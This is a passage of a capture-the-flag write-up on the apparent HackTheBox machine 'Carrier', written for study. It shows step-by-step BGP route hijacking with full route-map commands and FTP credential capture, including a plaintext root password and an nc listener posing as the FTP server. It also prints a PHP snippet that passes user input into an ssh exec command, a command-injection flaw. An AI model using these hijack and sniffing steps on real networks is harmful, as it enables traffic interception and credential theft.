Now I can open it with Wireshark:

[![1552342033518](https://0xdfimages.gitlab.io/img/1552342033518.png)](https://0xdfimages.gitlab.io/img/1552342033518.png)*click image for larger version*

There’s a single stream, and I can see both sides, including the password:

![1540473336839](https://0xdfimages.gitlab.io/img/1540473336839.png)

That’s actually surprising. I would expect to only see one side, since that’s all I poisoned. I’ll dig on that in Beyond Root, and show how to properly hijack both sides of the conversation.

### FTP

With the ftp password, I’ll connect:

```

root@r1:/dev/shm# ftp 10.120.15.10
Connected to 10.120.15.10.
220 (vsFTPd 3.0.3)
Name (10.120.15.10:root): 
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

If I try to do anything like `dir` or `ls`, it doesn’t like that:

```

ftp> ls
500 Illegal PORT command.
ftp: bind: Address already in use

```

Googling that error suggests I should switch to passive mode:

```

ftp> pass
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,120,15,10,219,214).
150 Here comes the directory listing.
-r--------    1 0        0              33 Jul 01  2018 root.txt
-rw-------    1 0        0              33 Mar 12 00:51 secretdata.txt
226 Directory send OK.

```

Now I’ll get the flag:

```

ftp> get root.txt
local: root.txt remote: root.txt
227 Entering Passive Mode (10,120,15,10,190,231).
150 Opening BINARY mode data connection for root.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (16.1375 kB/s)

```

```

root@r1:/dev/shm# cat root.txt 
2832e552...
root@r1:/dev/shm# rm root.txt 

```

## Beyond Root

### Unintended “Hijack”

It turns out, because of the way that all the hosts in this network are running on the same actual host, I can get the FTP connection just by adding the FTP server IP to eth2, skipping the BGP all together, and then listening with an FTP server (or impersonating one with `nc`):

```

root@r1:/dev/shm# ifconfig eth2
eth2      Link encap:Ethernet  HWaddr 00:16:3e:20:98:df  
          inet addr:10.78.11.1  Bcast:10.78.11.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe20:98df/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:4049 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3754 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:311916 (311.9 KB)  TX bytes:276473 (276.4 KB)

root@r1:/dev/shm# ifconfig eth2 10.120.15.10 netmask 255.255.255.128

root@r1:/dev/shm# ifconfig eth2
eth2      Link encap:Ethernet  HWaddr 00:16:3e:20:98:df  
          inet addr:10.120.15.10  Bcast:10.120.15.127  Mask:255.255.255.128
          inet6 addr: fe80::216:3eff:fe20:98df/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1011 errors:0 dropped:0 overruns:0 frame:0
          TX packets:832 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:75427 (75.4 KB)  TX bytes:63962 (63.9 KB)

```

Now I’ll just start a `nc` listener on 21. When it connects, I’ll play the role of the server. I’ve added a \* next to the stuff I typed:

```

root@r1:/dev/shm# nc -lnvp 21
Listening on [0.0.0.0] (family 0, port 21)
Connection from [10.78.10.2] port 21 [tcp/*] accepted (family 2, sport 40828)
220 (0xdf)*
USER root
331 Please specify the password.*
PASS BGPtelc0rout1ng
230 Login successful.*
SYST
215 UNIX Type: L8*
TYPE I
200 Switching to Binary mode.*
PASV
227 Entering Passive Mode (10,120,15,10,139,94)*
QUIT

```

Now I’ll set the eth2 address back:

```

root@r1:/dev/shm# ifconfig eth2 10.78.11.1 netmask 255.255.255.0

```

### Root Shell / Host

#### Access

It happens that the password for FTP is also the root password for the host, and ssh root logins are allowed. So, from my Kali host, I can ssh into 10.10.10.105 as root:

```

root@kali# ssh root@10.10.10.105
root@10.10.10.105's password: 
Permission denied, please try again.
root@10.10.10.105's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar 12 00:57:08 UTC 2019

  System load:  0.0                Users logged in:       0
  Usage of /:   40.8% of 19.56GB   IP address for ens33:  10.10.10.105
  Memory usage: 31%                IP address for lxdbr0: 10.99.64.1
  Swap usage:   0%                 IP address for lxdbr1: 10.120.15.10
  Processes:    216
 * Meltdown, Spectre and Ubuntu: What are the attack vectors,
   how the fixes work, and everything else you need to know
   - https://ubu.one/u2Know
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

4 packages can be updated.
0 updates are security updates.

Last login: Wed Sep  5 14:32:15 2018
root@carrier:~#

```

I can see now that FTP is set up to put users in their own homedir, and so when I connect as root, I get the docs from the home directory:

```

root@carrier:~# ls
root.txt  secretdata.txt

```

#### Containers

I can find the containers in `/var/lib/lxd/containers`:

```

root@carrier:/var/lib/lxd/containers# ls
r1  r2  r3  web

```

For each container, there’s a folder with the root file system:

```

root@carrier:/var/lib/lxd/containers/r1/rootfs/root# ls -l
total 4
-rw-r--r-- 1 100000 100000 33 Jul  2  2018 user.txt

```

I can also get a shell on any container using `lxc`:

```

root@carrier:/var/lib/lxd/containers/r1/rootfs/root# lxc exec r2 /bin/bash
root@r2:~#

```

I can check out the cron that’s running the FTP action:

```

root@r2:~# crontab -l | grep -v "^#"
*/1 * * * * ftp -n -p 10.120.15.10 < /root/ftpcommands.txt

root@r2:~# cat /root/ftpcommands.txt 
open 10.120.15.10
user root BGPtelc0rout1ng
put secretdata.txt
quit

```

### Routing Anomalies

#### Why Did I Get Both Sides

Here’s the network diagram again for reference:

![](https://0xdfimages.gitlab.io/img/carrier-net-diag.png)

I put in routes that told AS200 that I was the path to 10.120.0.0-127. So when AS300 has traffic going back to AS200, why did it come through me? It turns out that it’s because the cron to connect to the FTP server was running on the router from Zaza, and not an actual client in 10.100.0.0.

Think for a second about your VM setup for HTB. If it’s like mine, it establishes a vpn connection to HTB so that I have eth0 (on 10.1.1.0/24) and tun0 (on 10.10.14.0/23). When I try to connect to an IP, my computer looks at the routing tables to figure out which adapter to send the packet from, and then uses the IP address of that adapter as the source IP. It would not work if my VM sent a packet to a HTB machine with source address on 10.1.1.0/24.

The router is actually doing the same thing with the FTP connection. Without the hijack, it sends the traffic out the link directly connected to AS300. It will use the IP address on that link (which I can use `lxc exec r2 /bin/bash` from my root shell to see is 10.78.12.1). So when the AS300 router goes to send the return packet, the route to 10.78.12.1 is over the direct link.

Once I poison one way on the traffic, now the source address is 10.78.10.2. It turns out that the AS300 router’s route for that network is back through me.

#### Full Hijack

Had this been running on an actual client in 10.100.0.0, then the source port would have been the same, and the AS300 router would have sent the return back back directly to AS200. But if I wanted to properly hijack that connection as well, I could have using the same techniques. So I’ll pretend that the client was actually at 10.100.0.10, so I want to get all the traffic coming from AS300 to 10.100.0.0/25. I’ll use the `!` to add comments:

```

r1# configure terminal
r1(config)# ! create two lists
r1(config)# ip prefix-list 0xdf permit 10.120.15.0/25
r1(config)# ip prefix-list 0xdf-ret permit 10.100.0.0/25
r1(config)# !
r1(config)# ! start with routes going to as-200
r1(config)# ! first at pri 10 allow forward hijack
r1(config)# route-map to-as200 permit 10
r1(config-route-map)# match ip address prefix-list 0xdf
r1(config-route-map)# set community no-export
r1(config-route-map)# ! now at pri 15, deny return route
r1(config-route-map)# route-map to-as200 deny 15
r1(config-route-map)# match ip address prefix-list 0xdf-ret
r1(config-route-map)# ! at pri 20, allow everything else
r1(config-route-map)# route-map to-as200 permit 20
r1(config-route-map)# !
r1(config-route-map)# ! now routes shared with as-300
r1(config-route-map)# ! at pri 10, deny original hijack
r1(config-route-map)# route-map to-as300 deny 10
r1(config-route-map)# match ip address prefix-list 0xdf
r1(config-route-map)# ! at pri 15, allow with no export return hijack
r1(config-route-map)# route-map to-as300 permit 15
r1(config-route-map)# match ip address prefix-list 0xdf-ret
r1(config-route-map)# set community no-export
r1(config-route-map)# ! allow all other routes at pri 20
r1(config-route-map)# route-map to-as300 permit 20
r1(config-route-map)# !
r1(config-route-map)# router bgp 100
r1(config-router)# network 10.120.15.0 mask 255.255.255.128
r1(config-router)# network 10.100.0.0 mask 255.255.255.128
r1(config-router)# end
r1# clear ip bgp *

```

Now I can see the same route as I saw on the one-side hijack at AS200:

```

r1# show ip bgp neighbors 10.78.10.2 advertised-routes
...[snip]...
*> 10.120.15.0/25   10.78.10.1               0         32768 i
...[snip]...

```

I can see my return hijack on the AS300 router:

```

r1# show ip bgp neighbors 10.78.11.2 advertised-routes
...[snip]...
*> 10.100.0.0/25    10.78.11.1               0         32768 i
...[snip]...

```

### Web / Router Interaction

At the start of this box, I found command injection into a webpage, and when I used that to get a shell, I was on a router. How did that happen?

#### From the Router

I’ll start with the forensics that I could do right away from that first shell. Since I’m already root, I’ll use `tcpdump` to check out what happens when I push “Verify Status” on the webpage. I’ll use a filter to filter out any traffic from my host:

![](https://0xdfimages.gitlab.io/img/tcpdump-ssh-from-website-1540410313421.gif)

In the traffic above, I’ll see 10.99.64.251 connect to ssh on 10.99.64.2 (this router). Something in the webpage is causing the ssh to happen.

#### Log SSH Commands

I found [this script](https://jms1.net/log-session) for logging SSH commands on login. I’ll just place it in the `.ssh` folder as `log-session`. Then I’ll add a reference to it before the public key in the Authorized Keys file:

```

root@r1:~/.ssh# ls -l
total 28
-rw------- 1 root root  820 Oct 24 19:05 authorized_keys
-rw-r--r-- 1 root root  444 Jul  2 03:06 known_hosts
-rwxr-xr-x 1 root root 3259 Oct 24 19:05 log-session

root@r1:~/.ssh# cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5jsv1awPVyQj5qRSV3kRLNxLVPM7k4RyG1GsBr6BtHJjDqlmbpnruBamjjUeboTtZnZGXfEBoQfYEBBP3pdjshf7Z6w0mUxqseEfo3coR4JGV5r4y9Ed6bn+QqmgFg7ifbzQDf+UN6gHn81YwjikoeDqohXP132divV5LYZI4z6SRvzB2m9eWMpPFXP4yg7tY+CAFrKTAqHQlEtKGDmUfbp2yregg289t//EiNamqmm1bTleWiB0xXTBoze/5mFM40l3qwJbSxZlfp5WjWHIifG5Ccc9KyvNn3i58HxFSlEIqbG5v+jjz7OR7dOR+Im6T0i64ATNijMHRt1pcrLlR ppacket@carrier
command="/root/.ssh/log-session" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyC7C2dRJ7xrPyn8Ya5WLc/2fQub6bSvUJvr+s0sKpY95yUUuEDpP18WhBSJGoM7wo6y2byoS7upiVEHVeHS/dsCQpZ45IBC3vIJigtaiwRuhY01ZE/eF4YL/1+CzU2uO+9Rl48YspBZ2pkk0C0r1kosjPaB0Hs7oSv0qQrv11W/7dixqIp3RjejoOJfrtoG90B0uvAlqdgLpl6tvMRq7vAaE2jKYBqlaet1SLFSF5WjGSfh4BOvu9gEiDhyQn7HxMV9hDbVxv6x4LFNTBtEK0iR6v6/nCdWzu8GosMQweOOQESsubE5c+NPIjiQ6iX1v6u6wznZGyKWStpw59n49 root@web

```

I’ll push the button on the website, and then look at results:

```

root@r1:~/.ssh# cat log.2018-10-24.191336.10.99.64.251 
executing ps waux | grep quagga | grep -v grep
========================================
Script started on Wed 24 Oct 2018 07:13:36 PM UTC
quagga     5180  0.0  0.0  24500   620 ?        Ss   19:10   0:00 /usr/lib/quagga/zebra --daemon -A 127.0.0.1
quagga     5184  0.0  0.1  29444  3612 ?        Ss   19:10   0:00 /usr/lib/quagga/bgpd --daemon -A 127.0.0.1
root       5189  0.0  0.0  15432   164 ?        Ss   19:10   0:00 /usr/lib/quagga/watchquagga --daemon zebra bgpd

```

That’s a pretty neat was to see what was run!

#### With root Access

I can also just use my root shell on the host to check out the web directory, and look at the source for `diag.php`:

```

root@carrier:/var/lib/lxd/containers/web/rootfs/var/www/html# cat diag.php
...[snip]...
                        <?php
                        $check = base64_decode($_POST["check"]);
                        if ($check) {
                            exec("ssh -i /var/www/.ssh/id_rsa root@10.99.64.2 'ps waux | grep " . $check . " | grep -v grep'", $output);
                            foreach($output as $line) {
                                echo "<p>" . $line . "</p>";
                            }
                        }
                        ?>
...[snip]...

```

As suspected, the `check` parameter is base64 decoded, and then used to build an ssh command string.

### What is Secret Data

The FTP cron was putting a file called `secretdata.txt` over FTP. So what was it?

```

root@carrier:~# cat secretdata.txt 
56484a766247786c5a43456849513d3d

```

It looks kind of like a hash, and it is 32 characters. I can check to see if there’s anything interesting under the hex:

```

root@carrier:~# cat secretdata.txt | xxd -r -p
VHJvbGxlZCEhIQ==

```

Well that looks like base64… and it is:

```

root@carrier:~# cat secretdata.txt | xxd -r -p | base64 -d
Trolled!!!

```